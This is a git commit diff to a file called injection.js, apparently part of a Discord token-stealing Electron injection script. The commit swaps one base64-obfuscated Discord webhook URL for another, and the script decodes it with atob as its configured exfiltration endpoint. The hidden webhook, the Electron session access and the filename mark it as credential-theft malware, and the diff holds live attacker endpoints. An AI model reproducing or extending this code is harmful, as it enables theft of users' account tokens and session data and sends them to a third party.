a6fd057c54f92cb5446fcb0bf9f82304a21d8e17
43a1723 <hai1723notgay@gmail.com>
2024-06-12 12:05:08 +0700

    Update injection.js

--- injection.js
+++ injection.js
@@ -10,7 +10,7 @@ const {
     session,
     app
 } = require('electron');
-const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1MDAyNTQ1NjIwODQ0OTYyNi80MV9ldi1IZ05mY1VIajBLU29QT0dwVHpQLVB6ZE54TnZ1UUNCYl9GNnVaU2QycUVLZmlxNmRCUTItbk84UHUxa2hNUw=='
+const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1MDMxNDY2NTQwNjM2OTg1NC9kUDVNR0ZsTlBSaVhoUFR0MnZJWG1ObDRQY05mN09mT3d3NHVXS0huR1N5emN5R3JvVWstWm1laVJFQzZTRjZnSERtMw=='
 
 const CONFIG = {
     webhook: atob(encodedHook),
